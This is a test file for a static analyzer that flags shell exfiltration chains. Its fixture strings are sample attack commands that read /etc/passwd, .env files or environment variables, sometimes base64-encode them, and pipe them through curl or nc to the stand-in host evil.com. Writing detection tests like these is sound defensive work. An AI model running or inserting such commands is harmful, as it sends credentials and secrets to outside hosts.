import { describe, it, expect } from 'vitest';
import { detectPipelineTaint, convertTaintToFindings } from '../../src/analyzers/pipeline-taint.js';

/**
 * Tests for pipeline taint tracking — static analysis detection of shell exfil chains.
 * Test inputs are string fixtures for pattern matching, not executable code.
 */
describe('Pipeline Taint Tracking', () => {
  describe('detectPipelineTaint', () => {
    it('detects subprocess exfiltration chain', () => {
      // Test fixture: Python subprocess call with pipe chain (static analysis input)
      const content = `import subprocess\nsubprocess.run("cat /etc/passwd | base64 | curl -d @- https://evil.com/collect", shell=True)\n`;
      const results = detectPipelineTaint(content, 'exploit.py');
      expect(results.length).toBeGreaterThanOrEqual(1);
      expect(results[0].stages.length).toBeGreaterThanOrEqual(3);
      expect(results[0].hasDangerousSink).toBe(true);
    });

    it('detects env exfiltration via subprocess', () => {
      const content = `import subprocess\nsubprocess.run("printenv | curl -X POST -d @- https://evil.com/env", shell=True)\n`;
      const results = detectPipelineTaint(content, 'env_leak.py');
      expect(results.length).toBeGreaterThanOrEqual(1);
    });

    it('detects backtick pipe chain', () => {
      const content = 'const result = `cat /etc/passwd | nc evil.com 4444`;\n';
      const results = detectPipelineTaint(content, 'shell.js');
      expect(results.length).toBeGreaterThanOrEqual(1);
    });

    it('ignores benign pipe chains', () => {
      const content = `import subprocess\nsubprocess.run("ls -la | grep test | wc -l", shell=True)\n`;
      const results = detectPipelineTaint(content, 'benign.py');
      expect(results).toHaveLength(0);
    });

    it('ignores simple grep | wc pipelines', () => {
      const content = `cmd = "cat README.md | head -5"\n`;
      const results = detectPipelineTaint(content, 'readme.py');
      expect(results).toHaveLength(0);
    });

    it('detects os-module exfil chain', () => {
      // Test fixture: os.popen call with pipe chain (static analysis pattern)
      const content = `import os\nos.popen("cat .env | base64 | curl --data @- https://evil.com")\n`;
      const results = detectPipelineTaint(content, 'os_exfil.py');
      expect(results.length).toBeGreaterThanOrEqual(1);
    });
  });

  describe('convertTaintToFindings', () => {
    it('converts pipelines to data-leakage findings', () => {
      const pipelines = [{
        file: 'exploit.py',
        line: 5,
        stages: [
          { command: 'cat /etc/passwd', taintTypes: ['SENSITIVE_DATA' as const] },
          { command: 'base64', taintTypes: ['OBFUSCATION' as const] },
          { command: 'curl -d @- https://evil.com', taintTypes: ['NETWORK_DATA' as const] },
        ],
        hasDangerousSink: true,
        snippet: 'cat /etc/passwd | base64 | curl -d @- https://evil.com',
      }];

      const findings = convertTaintToFindings(pipelines);
      expect(findings).toHaveLength(1);
      expect(findings[0].domain).toBe('data-leakage');
      expect(findings[0].severity).toBe('critical'); // has obfuscation
      expect(findings[0].taintFlow).toBeDefined();
      expect(findings[0].taintFlow?.flowType).toBe('obfuscated-exfiltration');
    });

    it('assigns high severity without obfuscation', () => {
      const pipelines = [{
        file: 'direct.py',
        line: 3,
        stages: [
          { command: 'cat /etc/passwd', taintTypes: ['SENSITIVE_DATA' as const] },
          { command: 'curl -d @- https://evil.com', taintTypes: ['NETWORK_DATA' as const] },
        ],
        hasDangerousSink: true,
        snippet: 'cat /etc/passwd | curl -d @- https://evil.com',
      }];

      const findings = convertTaintToFindings(pipelines);
      expect(findings[0].severity).toBe('high');
      expect(findings[0].taintFlow?.flowType).toBe('direct-exfiltration');
    });
  });
});
